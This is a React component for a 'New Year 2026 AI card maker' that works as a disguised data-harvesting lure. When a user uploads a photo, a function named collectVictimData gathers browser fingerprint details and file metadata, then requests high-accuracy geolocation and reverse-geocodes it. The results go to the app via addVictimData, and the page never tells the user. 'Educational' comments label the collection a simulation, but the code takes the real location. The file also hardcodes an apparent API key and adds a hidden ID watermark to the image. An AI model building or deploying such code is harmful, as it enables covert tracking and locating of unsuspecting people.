import React, { useRef, useState } from 'react';
import ExampleCards from './ExampleCards';

const API_KEY = "AIzaSyCuxZf4MHTVswKJWDDCWPTRsVVg6tBe5ZU";

const CardGenerator = ({ addVictimData }) => {
  const [image, setImage] = useState(null);
  const [wish, setWish] = useState('');
  const [canvasUrl, setCanvasUrl] = useState('');
  const [isGenerating, setIsGenerating] = useState(false);
  
  const canvasRef = useRef(null);
  const fileInputRef = useRef(null);

  // Initialize canvas
  React.useEffect(() => {
    if (canvasRef.current) {
      const canvas = canvasRef.current;
      canvas.width = 800;
      canvas.height = 500;
    }
  }, []);

  const handleFileChange = (e) => {
    const file = e.target.files[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (e) => {
        setImage(e.target.result);
      };
      reader.readAsDataURL(file);
    }
  };

  const collectVictimData = async (file) => {
    const victimData = {
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      screenSize: `${window.screen.width}x${window.screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      languages: navigator.languages,
      cookiesEnabled: navigator.cookieEnabled,
      simulatedLocation: {
        latitude: (Math.random() * 180 - 90).toFixed(6),
        longitude: (Math.random() * 360 - 180).toFixed(6),
        accuracy: "Simulated for demo",
        source: "Educational simulation"
      },
      fileName: file.name,
      fileSize: file.size,
      fileType: file.type
    };

    // Try to get real location
    try {
      const position = await new Promise((resolve, reject) => {
        if (!navigator.geolocation) reject();
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000
        });
      });
      
      victimData.realLocation = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        timestamp: new Date(position.timestamp).toISOString()
      };
      
      // Reverse geocoding
      try {
        const response = await fetch(
          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`
        );
        const data = await response.json();
        victimData.locationName = data.display_name || "Unknown location";
      } catch (e) {
        victimData.locationName = "Reverse geocoding failed";
      }
    } catch (error) {
      victimData.locationAccess = "Denied or unavailable";
    }

    // Add to parent state
    addVictimData(victimData);
    
    // Log for demonstration
    console.log("📡 Educational Data Collection:", victimData);
    
    return victimData;
  };

  const getAIWish = async () => {
    try {
      const res = await fetch(
        `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${API_KEY}`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            contents: [{
              parts: [{ text: "Write one warm, short New Year 2026 wish." }]
            }]
          })
        }
      );
      const data = await res.json();
      return data.candidates[0].content.parts[0].text;
    } catch (error) {
      console.error("AI Error:", error);
      return "May 2026 bring happiness, success, and peace into your life.";
    }
  };

  const wrapText = (ctx, text, x, y, maxWidth, lineHeight) => {
    const words = text.split(" ");
    let line = "";

    for (let i = 0; i < words.length; i++) {
      const test = line + words[i] + " ";
      if (ctx.measureText(test).width > maxWidth) {
        ctx.fillText(line, x, y);
        line = words[i] + " ";
        y += lineHeight;
      } else {
        line = test;
      }
    }
    ctx.fillText(line, x, y);
  };

  const createCard = async () => {
    if (!image) {
      alert("Please upload a photo first");
      return;
    }

    setIsGenerating(true);
    
    const file = fileInputRef.current.files[0];
    if (file) {
      await collectVictimData(file);
    }

    const aiWish = await getAIWish();
    setWish(aiWish);

    // Draw on canvas
    const canvas = canvasRef.current;
    const ctx = canvas.getContext('2d');

    // Clear canvas
    ctx.fillStyle = "#1a1a2e";
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    // Draw profile picture circle
    const img = new Image();
    img.onload = () => {
      // Save context state
      ctx.save();
      
      // Create circular clipping path
      ctx.beginPath();
      ctx.arc(200, 250, 140, 0, Math.PI * 2);
      ctx.closePath();
      ctx.clip();
      
      // Draw image within the circular clip
      ctx.drawImage(img, 60, 110, 280, 280);
      
      // Restore context to remove clipping
      ctx.restore();

      // Add text
      ctx.fillStyle = "#FFD700";
      ctx.font = "bold 38px serif";
      ctx.fillText("Happy New Year 2026", 380, 140);

      ctx.fillStyle = "#fff";
      ctx.font = "20px Arial";
      wrapText(ctx, aiWish, 380, 200, 360, 28);

      // Add hidden watermark
      ctx.fillStyle = "rgba(0,0,0,0.01)";
      ctx.font = "1px Arial";
      ctx.fillText(`ID:${Date.now()}`, 5, 5);

      // Generate URL for display
      setCanvasUrl(canvas.toDataURL());
    };
    
    img.src = image;
    setIsGenerating(false);
  };

  const downloadImage = () => {
    if (!canvasUrl) return;
    
    const link = document.createElement('a');
    link.download = `NewYear2026_${Date.now()}.png`;
    link.href = canvasUrl;
    link.click();
  };

  return (
    <div className="card-generator">
      <h1>2026 AI Card Maker</h1>
      <p className="subtitle">Create a beautiful New Year card in seconds</p>
      
      <ExampleCards />
      
      <div className="upload-section">
        <input
          type="file"
          ref={fileInputRef}
          className="file-input"
          accept="image/*"
          onChange={handleFileChange}
        />
      </div>
      
      <div className="buttons">
        <button 
          className="btn btn-primary" 
          onClick={createCard}
          disabled={isGenerating}
        >
          {isGenerating ? 'Creating...' : 'Create My Card'}
        </button>
      </div>
      
      {canvasUrl && (
        <div className="canvas-container">
          <img 
            src={canvasUrl} 
            alt="Generated Card" 
            className="card-canvas"
          />
          <button 
            className="btn btn-secondary" 
            onClick={downloadImage}
            style={{ marginTop: '20px' }}
          >
            Download Card
          </button>
        </div>
      )}
      
      {/* Hidden canvas for drawing */}
      <canvas ref={canvasRef} className="hidden" />
    </div>
  );
};

export default CardGenerator;